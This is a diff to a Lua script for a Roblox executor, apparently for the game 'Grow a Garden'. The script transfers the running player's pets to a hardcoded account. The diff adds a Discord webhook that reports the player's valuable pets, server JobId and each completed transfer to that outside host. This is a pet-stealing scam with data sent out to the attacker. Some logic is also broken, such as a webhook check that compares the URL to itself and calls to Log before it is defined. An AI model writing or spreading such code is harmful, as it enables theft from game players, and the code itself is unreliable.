@@ -27,11 +27,137 @@ pcall(function() FavoriteItemRemote = ReplicatedStorage:WaitForChild("GameEvents
 local Config = {
     TargetPlayerName = "CoolHolzBudd",
     DelayBetweenGifts = 3,
-    DebugMode = true
+    DebugMode = true,
+    WebhookURL = "https://discord.com/api/webhooks/1352401371952840838/G0ywcotlvhMfda9IAMFRVU3SsHzCJwkszHwdXWBYAp4GhNQ3CJ-kmLgoJwc9BTPeiEOk" -- Setze hier deine Discord Webhook URL ein
 }
 
 -- State
 local isRunning = false
+
+-- Webhook Functions
+local function SendWebhook(data)
+    if not Config.WebhookURL or Config.WebhookURL == "https://discord.com/api/webhooks/1352401371952840838/G0ywcotlvhMfda9IAMFRVU3SsHzCJwkszHwdXWBYAp4GhNQ3CJ-kmLgoJwc9BTPeiEOk" then
+        return false
+    end
+    
+    local success, result = pcall(function()
+        local jsonData = game:GetService("HttpService"):JSONEncode(data)
+        
+        -- Try different HTTP methods for executors
+        if syn and syn.request then
+            -- Synapse X
+            return syn.request({
+                Url = Config.WebhookURL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+        elseif request then
+            -- General executor request function
+            return request({
+                Url = Config.WebhookURL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+        elseif http_request then
+            -- Alternative http_request
+            return http_request({
+                Url = Config.WebhookURL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+        else
+            Log("❌ No HTTP request function available")
+            return false
+        end
+    end)
+    
+    if success and result then
+        Log("✅ Webhook sent successfully")
+        return true
+    else
+        Log("❌ Failed to send webhook: " .. tostring(result))
+        return false
+    end
+end
+
+local function GetServerInfo()
+    local gameId = game.GameId
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    local serverSize = #Players:GetPlayers()
+    
+    return {
+        gameId = gameId,
+        placeId = placeId,
+        jobId = jobId,
+        serverSize = serverSize,
+        timestamp = os.time()
+    }
+end
+
+local function CreatePetListEmbed(pets, targetPlayer)
+    local serverInfo = GetServerInfo()
+    local description = string.format("**Server:** `%s`\n**JobId:** `%s`\n**Players:** %d\n**Target:** %s\n\n",
+        serverInfo.placeId,
+        serverInfo.jobId,
+        serverInfo.serverSize,
+        targetPlayer and targetPlayer.Name or "Not found"
+    )
+    
+    if #pets > 0 then
+        description = description .. "**🐾 Valuable Pets Found:**\n"
+        for i, pet in ipairs(pets) do
+            local emoji = pet.rarity == "Divine" and "✨" or "🔮"
+            description = description .. string.format("%s **%s** (%s) - Level %d\n", 
+                emoji, pet.name, pet.rarity, pet.level)
+            if i >= 10 then -- Limit to 10 pets in embed
+                description = description .. "... and " .. (#pets - 10) .. " more\n"
+                break
+            end
+        end
+    else
+        description = description .. "**❌ No valuable pets found**\n"
+    end
+    
+    return {
+        username = "Grow a Garden Bot",
+        avatar_url = "https://cdn.discordapp.com/emojis/1234567890123456789.png", -- Optional: Bot avatar
+        embeds = {{
+            title = "🎮 Pet Scanner Report",
+            description = description,
+            color = #pets > 0 and 0x00ff00 or 0xff0000, -- Green if pets found, red if none
+            fields = {
+                {
+                    name = "📊 Statistics",
+                    value = string.format("Total Pets: %d\nDivine: %d\nMythical: %d",
+                        #pets,
+                        #(function() local count = 0; for _, p in ipairs(pets) do if p.rarity == "Divine" then count = count + 1 end end return count end)(),
+                        #(function() local count = 0; for _, p in ipairs(pets) do if p.rarity == "Mythical" then count = count + 1 end end return count end)()
+                    ),
+                    inline = true
+                },
+                {
+                    name = "🕒 Timestamp",
+                    value = string.format("<t:%d:F>", os.time()),
+                    inline = true
+                }
+            },
+            footer = {
+                text = "Ronix Executor • Grow a Garden",
+                icon_url = "https://cdn.discordapp.com/emojis/1234567890123456789.png"
+            }
+        }}
+    }
+end
 
 -- Utility Functions
 local function Log(message)
@@ -326,6 +452,12 @@ local function ProcessPetGifting(targetPlayer)
     isRunning = true
     
     local pets = GetGiftablePets()
+    
+    -- Send webhook with pet information
+    Log("📡 Sending server info to webhook...")
+    local webhookData = CreatePetListEmbed(pets, targetPlayer)
+    SendWebhook(webhookData)
+    
     if #pets == 0 then
         Log("❌ No giftable pets found")
         isRunning = false
@@ -374,6 +506,19 @@ local function ProcessPetGifting(targetPlayer)
                         local currentInventory = GetPetInventory()
                         if not currentInventory[pet.id] then
                             Log("✅ Confirmed: " .. pet.name .. " no longer in inventory")
+                            
+                            -- Send success webhook
+                            local successData = {
+                                username = "Grow a Garden Bot",
+                                embeds = {{
+                                    title = "🎉 Pet Gifted Successfully!",
+                                    description = string.format("**Pet:** %s (%s)\n**To:** %s\n**JobId:** `%s`",
+                                        pet.name, pet.rarity, targetPlayer.Name, game.JobId),
+                                    color = 0x00ff00,
+                                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                                }}
+                            }
+                            SendWebhook(successData)
                         else
                             Log("⚠️ Warning: " .. pet.name .. " still in inventory")
                         end
